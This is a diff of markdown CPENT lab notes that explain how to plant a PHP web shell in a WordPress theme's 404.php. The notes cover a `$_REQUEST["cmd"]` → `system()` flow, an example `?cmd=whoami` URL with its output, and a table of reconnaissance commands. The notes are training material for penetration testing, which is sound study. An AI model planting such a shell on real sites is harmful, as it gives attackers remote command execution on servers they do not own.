@@ -1,7 +1,7 @@
-````markdown
 # PHP Web Shell (CPENT Lab Notes)
 
 ## Objective
+
 Upload a simple **PHP Web Shell** into **404.php** to execute Linux commands through the browser.
 
 ---
@@ -24,21 +24,21 @@ if(isset($_REQUEST["cmd"])){
 
 ## How it Works
 
-```
+```text
 Browser
-   │
+      │
 ?cmd=whoami
-   │
-   ▼
+      │
+      ▼
 404.php
-   │
+      │
 system("whoami")
-   │
-   ▼
+      │
+      ▼
 Linux Server
-   │
-   ▼
-Output shown in Browser
+      │
+      ▼
+Output in Browser
 ```
 
 ---
@@ -49,42 +49,44 @@ Output shown in Browser
 |------|---------|
 | `$_REQUEST["cmd"]` | Reads the command from the URL. |
 | `system($cmd)` | Executes the command on the Linux server. |
-| `<pre>` | Displays output in a readable format. |
+| `echo "<pre>"` | Displays output in a readable format. |
 | `die;` | Stops further PHP execution. |
 
 ---
 
 ## Example
 
-**URL**
+### URL
 
 ```text
 http://target/wp-content/themes/twentyfifteen/404.php?cmd=whoami
 ```
 
-**Command Executed**
+### Command Executed
 
 ```bash
 whoami
 ```
 
-**Possible Output**
+### Output
 
 ```text
 www-data
 ```
 
+**Meaning:** The web server is running as the **www-data** user.
+
 ---
 
 ## Useful Commands
 
-| URL Parameter | Linux Command | Purpose |
-|---------------|---------------|---------|
-| `?cmd=whoami` | `whoami` | Current user |
-| `?cmd=id` | `id` | User & Group IDs |
-| `?cmd=pwd` | `pwd` | Current directory |
-| `?cmd=ls` | `ls` | List files |
-| `?cmd=ls -la` | `ls -la` | Detailed file listing |
+| URL Parameter | Purpose |
+|--------------|---------|
+| `?cmd=whoami` | Shows the current Linux user |
+| `?cmd=id` | Displays user and group IDs |
+| `?cmd=pwd` | Shows the current directory |
+| `?cmd=ls` | Lists files |
+| `?cmd=ls -la` | Lists all files with details |
 
 ---
 
@@ -92,7 +94,7 @@ www-data
 
 - Editable through **Appearance → Theme Editor**
 - Executes PHP code
-- Easy place to upload a web shell
+- Can be used as a **Web Shell** entry point
 
 ---
 
@@ -121,12 +123,10 @@ Execute Linux Commands
 
 ---
 
-## Remember
+## Key Points
 
-- **`$_REQUEST`** → Gets the command from the URL.
-- **`system()`** → Executes the command on the server.
-- **404.php** → Used as the web shell entry point.
+- `$_REQUEST` → Gets the command from the URL.
+- `system()` → Executes the command on the Linux server.
+- `404.php` → Used to upload the web shell.
 - Output is displayed directly in the browser.
-````
-
-This is enough for **CPENT revision**—only the important concepts, commands, and flow without unnecessary details.
+- `www-data` is the default Linux user for Apache on Ubuntu/Debian systems.
